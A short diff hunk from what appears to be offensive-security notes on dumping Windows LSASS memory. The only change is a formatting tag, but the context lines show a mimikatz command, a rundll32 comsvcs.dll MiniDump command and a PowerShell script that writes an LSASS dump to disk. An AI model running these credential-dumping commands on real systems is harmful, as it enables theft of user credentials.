@@ -20,7 +20,7 @@ sekurlsa::logonpasswords</code>
 This is a native Windows utility method which can we can use:<br>
 <code>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_Process_ID> C:\path</code><br>
 for getting lsass process ID, you can RUN "Get-Process lsass" on powershell.
-* User can also done this by making a PS script containing the following:
+* User can also done this by making a PS script containing the following:<br>
 <code>$lsass = Get-Process lsass
 $dumpPath = "C:\Users\Adwin2\Desktop\lsass.dmp"
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full</code><br><br>
